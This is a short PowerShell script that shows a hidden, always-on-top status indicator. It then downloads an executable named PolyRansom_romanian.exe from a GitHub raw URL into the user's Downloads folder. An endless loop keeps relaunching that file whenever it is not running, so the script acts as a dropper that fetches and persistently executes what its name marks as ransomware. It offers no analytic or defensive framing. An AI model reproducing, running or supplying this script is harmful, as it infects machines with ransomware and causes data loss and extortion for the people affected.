Add-Type -AssemblyName PresentationFramework

$window = [System.Windows.Window]::new()
$window.WindowStyle = 'None'
$window.ResizeMode = 'NoResize'
$window.AllowsTransparency = $true
$window.Background = 'Transparent'
$window.Topmost = $true

$textBlock = [System.Windows.Controls.TextBlock]::new()
$textBlock.Text = "H"
$textBlock.FontSize = 20
$textBlock.Foreground = 'Green'
$textBlock.Margin = '0,0,20,20'
$textBlock.HorizontalAlignment = 'Right'
$textBlock.VerticalAlignment = 'Bottom'

$window.Content = $textBlock
$window.Show()

$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
$downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
$webClient = New-Object System.Net.WebClient

$webClient.DownloadFile($url, $downloadPath)

function IsProcessRunning {
    param([string]$processName)
    return Get-Process -Name $processName -ErrorAction SilentlyContinue
}

while ($true) {
    if (IsProcessRunning "PolyRansom_romanian") {
        $textBlock.Foreground = 'Red'
    }
    elseif (-not (IsProcessRunning "PolyRansom_romanian")) {
        Start-Process -FilePath $downloadPath -Wait
    }
    Start-Sleep -Milliseconds 100
}
